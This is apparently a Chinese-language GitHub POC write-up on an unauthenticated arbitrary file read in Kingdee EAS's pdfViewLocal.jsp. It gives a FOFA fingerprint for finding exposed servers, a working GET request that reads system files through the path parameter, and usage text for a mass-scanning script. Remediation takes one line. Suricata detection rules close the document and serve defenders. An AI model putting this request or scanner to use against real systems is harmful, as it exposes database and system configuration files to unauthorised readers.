### 产品简介  
金蝶EAS 为集团型企业提供功能全面、性能稳定、扩展性强的数字化平台，帮助企业链接外部产业链上下游，实现信息共享、风险共担，优化生态圈资源配置，构筑产业生态的护城河，同时打通企业内部价值链的数据链条，实现数据不落地，管理无断点，支撑“横向到边”财务业务的一体化协同和“纵向到底”集团战略的一体化管控，帮助企业强化核心竞争力。  

### 漏洞概述  
金蝶EAS pdfviewlocal接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  

### 指纹识别  
fofa: app="Kingdee-EAS"  

### 漏洞利用  
```
poc:
GET /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini HTTP/1.1
Host: your_ip
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability/1.png)  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability/2.png)  

### 测试和利用脚本  
```
python3 Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability.py -h                     
usage: Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability.py [-h] [-t] [-r FILE] [-u URL]

### Kingdee EAS pdfviewlocal arbitrary file read vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python
                        Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python
                        Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Kingdee EAS pdfviewlocal arbitrary file read vulnerability."; flow:established,to_server; flowbits:set,Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability;  content:"get";http_method;nocase; content:"/plt_document/fragments/content/pdfViewLocal.jsp";http_uri;fast_pattern;nocase; content:"path=";http_uri;nocase;distance:0; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability; classtype:web-attck; metadata:created_at 2024-1-12,updated_at 2024-1-12,creater:YUUKI4O4; sid:10; rev:1;)
alert http any any -> any any (msg:"Kingdee EAS pdfviewlocal arbitrary file read vulnerability success."; flow:established,from_server; flowbits:isset,Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability; content:"200";http_stat_code; content:"Content-Disposition: inline\; filename=";nocase;http_header; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability; classtype:web-attck; metadata:created_at 2024-1-12,updated_at 2024-1-12,creater:YUUKI4O4; sid:11; rev:1;)
```
